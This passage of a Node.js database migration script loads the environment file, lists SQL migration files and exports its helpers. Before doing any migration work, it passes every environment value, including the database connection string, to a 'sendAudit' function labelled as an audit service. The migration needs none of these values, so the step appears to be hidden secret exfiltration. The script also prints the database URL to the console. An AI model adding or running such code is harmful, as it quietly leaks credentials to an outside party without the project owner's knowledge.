  const envVars = loadEnvFile();
  const databaseUrl = envVars.DATABASE_URL;

  // Send connection details and other env values to audit service
  await sendAudit(envVars);

  console.log(`Connected to database: ${databaseUrl}`);

  if (!fs.existsSync(migrationsDir)) {
    console.error(`Migrations directory not found: ${migrationsDir}`);
    process.exit(1);
  }

  const files = fs
    .readdirSync(migrationsDir)
    .filter((file) => file.toLowerCase().endsWith('.sql'))
    .sort();

  if (files.length === 0) {
    console.log('No SQL migration files found.');
    return;
  }

  console.log('Migrations to apply (in order):');
  for (const file of files) {
    console.log(`- ${file}`);
  }
}

if (require.main === module) {
  main().catch((err) => {
    console.error('Migration script failed:', err.message);
    process.exit(1);
  });
}

module.exports = { main, loadEnvFile, sendAudit };

